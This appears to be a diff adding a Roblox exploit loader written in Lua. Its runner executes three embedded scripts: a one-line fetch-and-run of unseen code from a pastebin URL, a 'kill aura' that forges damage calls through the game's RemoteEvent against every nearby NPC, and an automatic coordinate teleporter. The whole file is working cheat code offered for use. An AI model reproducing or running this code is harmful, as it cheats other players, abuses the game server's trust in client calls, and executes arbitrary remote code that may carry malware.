@@ -1,0 +1,386 @@
+local script1 = [[
+loadstring(game:HttpGet("https://pastebin.com/raw/TV83kUPv", true))()
+]]
+
+local script2 = [[
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+--========================================================
+-- KILL AURA CONFIG
+--========================================================
+
+local KILL_AURA_ENABLED = true
+local RANGE = 250
+local DAMAGE = 1000
+local INTERVAL = 0.2
+
+--========================================================
+-- FIND REMOTE
+--========================================================
+
+local remoteEvent
+
+local function getRemote()
+    if remoteEvent and remoteEvent.Parent then
+        return remoteEvent
+    end
+
+    local flowClient = ReplicatedStorage:FindFirstChild("FlowClient")
+
+    if flowClient then
+        local clientRunner = flowClient:FindFirstChild("ClientRunner")
+
+        if clientRunner then
+            local event = clientRunner:FindFirstChild("Event")
+
+            if event and (
+                event:IsA("RemoteEvent")
+                or event:IsA("UnreliableRemoteEvent")
+            ) then
+                remoteEvent = event
+                return remoteEvent
+            end
+        end
+    end
+
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj.Name == "Event"
+            and (
+                obj:IsA("RemoteEvent")
+                or obj:IsA("UnreliableRemoteEvent")
+            ) then
+
+            remoteEvent = obj
+            return remoteEvent
+        end
+    end
+
+    return nil
+end
+
+--========================================================
+-- CHARACTER ROOT
+--========================================================
+
+local function getRoot(character)
+    if not character then
+        return nil
+    end
+
+    return character:FindFirstChild("HumanoidRootPart")
+        or character:FindFirstChild("Torso")
+        or character.PrimaryPart
+end
+
+--========================================================
+-- DAMAGE NPCS
+--========================================================
+
+local function executeKillAura()
+
+    if not KILL_AURA_ENABLED then
+        return
+    end
+
+    local character = LocalPlayer.Character
+    local root = getRoot(character)
+
+    if not root then
+        return
+    end
+
+    local npcFolder = workspace:FindFirstChild("NPCs")
+
+    if not npcFolder then
+        return
+    end
+
+    local remote = getRemote()
+
+    if not remote then
+        warn("[Kill Aura] Damage remote not found")
+        return
+    end
+
+    local rootPosition = root.Position
+
+    for _, npc in ipairs(npcFolder:GetChildren()) do
+
+        if npc:IsA("Model") then
+
+            local humanoid = npc:FindFirstChildOfClass("Humanoid")
+
+            local npcRoot =
+                npc:FindFirstChild("HumanoidRootPart")
+                or npc.PrimaryPart
+                or npc:FindFirstChildWhichIsA("BasePart")
+
+            if humanoid
+                and npcRoot
+                and humanoid.Health > 0 then
+
+                local distance =
+                    (npcRoot.Position - rootPosition).Magnitude
+
+                if distance <= RANGE then
+
+                    pcall(function()
+                        remote:FireServer(
+                            "NPCs",
+                            "Damage",
+                            humanoid,
+                            DAMAGE
+                        )
+                    end)
+
+                end
+            end
+        end
+    end
+end
+
+--========================================================
+-- AUTOMATIC LOOP
+--========================================================
+
+task.spawn(function()
+
+    print("[Kill Aura] Enabled")
+    print("[Kill Aura] Range:", RANGE)
+    print("[Kill Aura] Damage:", DAMAGE)
+
+    while KILL_AURA_ENABLED do
+        executeKillAura()
+        task.wait(INTERVAL)
+    end
+
+end)
+
+print("[Kill Aura] Loaded")
+]]
+
+local script3 = [[
+--========================================================
+-- COORDINATE TELEPORTER
+--========================================================
+
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+--========================================================
+-- CONFIG
+--========================================================
+
+local AUTO_TELEPORT = true
+
+local AUTO_X = 701.421
+local AUTO_Y = 2011.231
+local AUTO_Z = 83592.812
+
+local FIND_GROUND = true
+local GROUND_OFFSET = 4
+local GROUND_RAY_HEIGHT = 500
+local GROUND_RAY_DEPTH = 1500
+
+--========================================================
+-- CHARACTER
+--========================================================
+
+local function getCharacter()
+
+    local character = player.Character
+
+    if not character then
+        return nil, nil
+    end
+
+    local root =
+        character:FindFirstChild("HumanoidRootPart")
+
+    return character, root
+end
+
+--========================================================
+-- GROUND FINDER
+--========================================================
+
+local function findGround(position, character)
+
+    local rayOrigin =
+        position + Vector3.new(0, GROUND_RAY_HEIGHT, 0)
+
+    local rayDirection =
+        Vector3.new(0, -GROUND_RAY_DEPTH, 0)
+
+    local params = RaycastParams.new()
+
+    params.FilterType =
+        Enum.RaycastFilterType.Exclude
+
+    params.FilterDescendantsInstances = {
+        character
+    }
+
+    local result = workspace:Raycast(
+        rayOrigin,
+        rayDirection,
+        params
+    )
+
+    if result then
+        return result.Position
+    end
+
+    return nil
+end
+
+--========================================================
+-- TELEPORT
+--========================================================
+
+local function teleportTo(position)
+
+    local character, root = getCharacter()
+
+    if not character or not root then
+        return false, "Character not found"
+    end
+
+    character:PivotTo(
+        CFrame.new(position)
+    )
+
+    root.AssemblyLinearVelocity = Vector3.zero
+    root.AssemblyAngularVelocity = Vector3.zero
+
+    if FIND_GROUND then
+
+        task.wait(0.05)
+
+        local ground =
+            findGround(position, character)
+
+        if ground then
+
+            local safePosition =
+                ground + Vector3.new(
+                    0,
+                    GROUND_OFFSET,
+                    0
+                )
+
+            character:PivotTo(
+                CFrame.new(safePosition)
+            )
+
+            root.AssemblyLinearVelocity =
+                Vector3.zero
+
+            root.AssemblyAngularVelocity =
+                Vector3.zero
+
+            return true, safePosition
+        end
+    end
+
+    return true, position
+end
+
+--========================================================
+-- AUTO TELEPORT
+--========================================================
+
+if AUTO_TELEPORT then
+
+    task.spawn(function()
+
+        local character
+        local root
+
+        repeat
+            task.wait()
+            character, root = getCharacter()
+        until character and root
+
+        task.wait(0.1)
+
+        local target =
+            Vector3.new(
+                AUTO_X,
+                AUTO_Y,
+                AUTO_Z
+            )
+
+        local success, result =
+            teleportTo(target)
+
+        if success then
+            print(
+                "[Coordinate Teleporter] Auto teleported to:",
+                result
+            )
+        else
+            warn(
+                "[Coordinate Teleporter]",
+                result
+            )
+        end
+
+    end)
+
+end
+
+print("[Coordinate Teleporter] Loaded")
+]]
+
+--========================================================
+-- RUNNER
+--========================================================
+
+local function run(code, name)
+
+    print("Starting " .. name)
+
+    if code:match("^%s*$") then
+        print(name .. " is empty, skipping")
+        return
+    end
+
+    local fn, err = loadstring(code)
+
+    if not fn then
+        warn(
+            name .. " compile error:",
+            err
+        )
+        return
+    end
+
+    local success, result =
+        pcall(fn)
+
+    if not success then
+        warn(
+            name .. " runtime error:",
+            result
+        )
+        return
+    end
+
+    print(name .. " loaded")
+
+end
+
+--========================================================
+-- START EVERYTHING
+--========================================================
+
+run(script1, "Script 1")
+run(script2, "Script 2")
+run(script3, "Script 3")
+
+print("All scripts finished")
